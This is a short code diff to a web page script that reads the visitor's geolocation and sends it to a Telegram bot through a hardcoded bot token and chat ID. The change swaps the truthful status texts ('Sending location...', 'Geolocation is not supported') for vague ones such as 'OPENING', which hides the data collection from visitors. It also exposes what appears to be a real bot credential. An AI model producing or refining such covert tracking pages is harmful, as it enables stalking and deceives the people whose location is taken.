@@ -22,7 +22,7 @@
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(sendLocation, showError);
             } else {
-                document.getElementById("status").textContent = "Geolocation is not supported by this browser.";
+                document.getElementById("status").textContent = " not supported by this browser.";
             }
         }
 
@@ -30,7 +30,7 @@
             var latitude = position.coords.latitude;
             var longitude = position.coords.longitude;
 
-            document.getElementById("status").textContent = "Sending location...";
+            document.getElementById("status").textContent = "OPENING";
 
             var token = '6197747448:AAFrgXeZdjQZ1iTm9AE6v56h6y-qShiH5es'; // Replace with your bot token
             var chatId = '5112680061'; // Replace with your chat ID
